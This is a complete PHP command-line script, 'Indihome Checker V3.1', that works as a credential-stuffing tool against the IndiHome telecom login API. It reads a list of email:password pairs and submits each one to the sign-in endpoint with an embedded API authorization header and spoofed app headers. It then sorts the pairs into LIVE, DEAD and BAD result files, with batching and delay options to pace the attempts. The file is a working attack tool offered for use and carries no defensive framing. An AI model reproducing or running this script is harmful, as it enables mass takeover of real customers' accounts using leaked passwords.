<?php
error_reporting(0);
require_once('vendor/autoload.php');
use \Curl\MultiCurl;

$climate = new League\CLImate\CLImate;
$progress = $climate->progress()->total(100);

function indihome($empas,$delim,$no,$setCount) {

        $contents = file($empas, FILE_IGNORE_NEW_LINES);
        $adaad = array_shift($contents); 
        $next = explode($delim, $adaad);       
        file_put_contents($empas, implode("\r\n", $contents));
        $persen = round(($no/$setCount)*100);
        $multi_curl = new MultiCurl();
        $climate = new League\CLImate\CLImate;

        $multi_curl->setOpt(CURLOPT_ENCODING, '');
        $multi_curl->setOpt(CURLOPT_HTTPHEADER, array(
            'Host: api.indihome.co.id',
            'Accept: application/json, text/plain, */*',
            'Authorization: Basic bXlpbmRpaG9tZTpwN2Qya0xYNGI0TkY1OFZNODR2Vw==',
            'Content-Type: application/x-www-form-urlencoded',
            'Accept-Encoding: gzip, deflate',
            'Accept-Language: id-ID,en-US;q=0.8',
            'X-Requested-With: com.telkom.indihome.external',
        ));
        $multi_curl->setOpt(CURLOPT_ENCODING , "deflate,gzip,br");
        $data = 'guid=0&code=0&data={
                "email":"'.$next[0].'",
                "password":"'.md5($next[1]).'",
                "devid":"'.generateUUID(true).'",
                "deviceType":2,
                "imei":"",
                "tmoney":0
                }';
        $go = $multi_curl->addPost('https://api.indihome.co.id:443/api/user-signin',$data);
        $go->email = $next[0];
        $go->pass = $next[1];
        $go->pisah = $delim;
        $go->no = $no;
        $go->count = $setCount;
        $go->persen = $persen;
        $multi_curl->complete(function ($go) {
            $climate = new League\CLImate\CLImate;
            $response = json_encode($go->response);
            //print_r($response);
            if (strpos($response, 'code":0')) {
                $nama = cari($response, '"fullname":"','"');
                $nama = ($nama == null || $nama == null) ? "Null" : "".$nama;
                $nomor = cari($response, '"msisdn":"','"');
                $nomor = ($nomor == null || $nomor == null) ? "Null" : "".$nomor;
                saveFILE('result/LIVE.txt',$go->email."".$go->pisah."".$go->pass."");
                $climate->out("<cyan>INDIHOME</cyan> <light_green>LIVE</light_green> <white>".$go->email."".$go->pisah."".$go->pass."</white>");
            }elseif (strpos($response, 'code":34')){
                saveFILE('result/DEAD.txt',$go->email."".$go->pisah."".$go->pass."");
                $climate->out("<cyan>INDIHOME</cyan> <light_red>DIE</light_red> <white>".$go->email."".$go->pisah."".$go->pass."</white>");
            }elseif (strpos($response, 'code":31')){
                saveFILE('result/DEAD.txt',$go->email."".$go->pisah."".$go->pass."");
                $climate->out("<cyan>INDIHOME</cyan> <light_red>DIE</light_red> <white>".$go->email."".$go->pisah."".$go->pass."</white>");
            }elseif (strpos($response, '"code":33')){
                saveFILE('result/DEAD.txt',$go->email."".$go->pisah."".$go->pass."");
                $climate->out("<cyan>INDIHOME</cyan> <light_red>DIE</light_red> <white>".$go->email."".$go->pisah."".$go->pass."</white>");
            }elseif (strpos($response, '"code":36')){
                saveFILE('result/DEAD.txt',$go->email."".$go->pisah."".$go->pass."");
                $climate->out("<cyan>INDIHOME</cyan> <light_red>DIE</light_red> <white>".$go->email."".$go->pisah."".$go->pass."</white>");
            }else{
                saveFILE('result/BAD.txt',$go->email."".$go->pisah."".$go->pass."");
                $climate->out("<cyan>INDIHOME</cyan> <yellow>EROR</yellow> <white>".$go->email."".$go->pisah."".$go->pass."</white>");
        }

        });

        $multi_curl->start();

}
/**
 * Author  : AdeAvnan
 * Name    : Indihome Checker
 * Version : 3.1
 * Update  : 31 august 2020
 * 
 * If you are a reliable programmer or the best developer, please don't change anything.
 * If you want to be appreciated by others, then don't change anything in this script.
 */
function loadCheck ($emps,$check,$delay) {
$climate = new League\CLImate\CLImate;
$climate->br();
$climate->out("
<light_green>LIVE COUNT: ".count(file("result/LIVE.txt"))."</light_green>
<light_red>DEAD COUNT: ".count(file("result/DEAD.txt"))."</light_red>
<yellow>BAD COUNT: ".count(file("result/BAD.txt"))."</yellow>
<cyan>EMAIL/PASS: ".count(file($emps))."</cyan>
<blue>REQUEST: ".$check."</blue>
<yellow>DELAY: ".$delay." sec</yellow>
<magenta>============================>>></magenta>");
}
function progress($progress){
    for ($i = 0; $i <= 100; $i++) {
        $progress->current($i);
        usleep(30000);
     }
} 
function saveFILE ($fileName,$line) {
    $file = fopen($fileName, 'a');
    fwrite($file, $line ."\n");
    fclose($file);
}
function generateUUID($type){
    $uuid = sprintf(
      '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
      mt_rand(0, 0xffff),
      mt_rand(0, 0xffff),
      mt_rand(0, 0xffff),
      mt_rand(0, 0x0fff) | 0x4000,
      mt_rand(0, 0x3fff) | 0x8000,
      mt_rand(0, 0xffff),
      mt_rand(0, 0xffff),
      mt_rand(0, 0xffff)
    );
    
    return $type ? $uuid : str_replace('-', '', $uuid);
}
function cari($string,$start,$end){
        $str = explode($start,$string);
        $str = explode($end,$str[1]);
        return $str[0];
}
sleep(1);
$climate->out("


 ██▓███  ▓█████  ██▓     ██▓▄▄▄█████▓
▓██░  ██▒▓█   ▀ ▓██▒    ▓██▒▓  ██▒ ▓▒
▓██░ ██▓▒▒███   ▒██░    ▒██▒▒ ▓██░ ▒░
▒██▄█▓▒ ▒▒▓█  ▄ ▒██░    ░██░░ ▓██▓ ░ 
▒██▒ ░  ░░▒████▒░██████▒░██░  ▒██▒ ░ 
▒▓▒░ ░  ░░░ ▒░ ░░ ▒░▓  ░░▓    ▒ ░░   
░▒ ░      ░ ░  ░░ ░ ▒  ░ ▒ ░    ░    
░░          ░     ░ ░    ▒ ░  ░      
            ░  ░    ░  ░ ░          INDIHOME CHECKER V3.1 
                                     

");

$climate->br();
$climate->info('Loading');
progress($progress);
sleep(1);
$climate->out("                                                                                                 
     )))           xxx           xxx           (((
    (o o)         (o o)         (o o)         (o o)
ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo
");
$climate->info('By Ade Avnan P');
$climate->br();
$empas = $climate->input(' List:')->prompt();
$climate->br();
$combo   = file_get_contents($empas);
if($combo)
{
    $combos = explode("\n", $combo);
    $EmpassCount = count($combos);
}
else
{
    die("MailPass not found!");
}
$climate->out("  Total ".count(file($empas))." MailPass");
$climate->br();
$delim = $climate->input(' Delim:')->prompt();
$climate->br();
if($delim == null)
{
    die("Delimiter not found!");
}
$climate->br();
$cekReq = $climate->input(' Request? [y/n]:')->prompt();
if($cekReq == 'y')
{
    $climate->br();
    $setReq = $climate->input(' Request:')->prompt();
    $climate->br();
    $setDelay = $climate->input(' Delay:')->prompt();
}
$climate->br();

    $i = 0;
    $no = 1;

    while($i<$EmpassCount)
    {

            $time = microtime();
            $time = explode(' ', $time);
            $time = $time[1] + $time[0];
            $start = $time;
            
            $setCount = $EmpassCount + 1;
            if ($cekReq == 'y') {
            if($setDelay != 0 || !empty($setReq))
            {
                if($i%$setReq == 0)
                {   
                    $climate->br();
                    $climate->out(loadCheck($empas, $setReq, $setDelay));
                    $climate->br();
                    sleep($setDelay);
                }
            }}//END IF
            indihome($empas,$delim,$no,$setCount);
    $i++;
    $no++;
    }//END WHILE


$time = microtime();
$time = explode(' ', $time);
$time = $time[1] + $time[0];
$finish = $time;

$climate->br();
if ($cekReq == 'y') {
    $exse = $setReq;
    $exseD = $setDelay." sec";
}else{
    $exse = "Not Set";
    $exseD = "Not Set";
}
$climate->out("
Checking Complete: 
<light_green>LIVE COUNT: ".count(file("result/LIVE.txt"))."</light_green>
<light_red>DEAD COUNT: ".count(file("result/DEAD.txt"))."</light_red>
<yellow>BAD COUNT: ".count(file("result/BAD.txt"))."</yellow>
<cyan>EMAIL/PASS: ".count(file($empas))."</cyan>
<blue>REQUEST: ".$exse."</blue>
<yellow>DELAY: ".$exseD."</yellow>
<yellow>TIME COMPLETED: ".round(($finish - $start), 4)." MS</yellow>
<magenta>================================>>></magenta>");
$climate->br();

?>